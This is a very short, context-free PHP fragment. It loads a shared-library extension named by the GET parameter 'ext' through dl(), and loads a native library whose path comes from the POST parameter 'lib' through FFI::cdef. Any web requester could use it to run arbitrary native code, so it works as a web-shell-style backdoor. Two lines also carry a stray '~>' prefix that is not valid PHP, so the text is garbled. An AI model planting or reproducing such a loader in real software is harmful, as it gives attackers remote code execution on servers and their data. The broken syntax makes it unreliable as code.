<?php
$ext = $_GET['ext'];
~>dl($ext . '.so');
~>$ffi = FFI::cdef("int run(void);", $_POST['lib']);
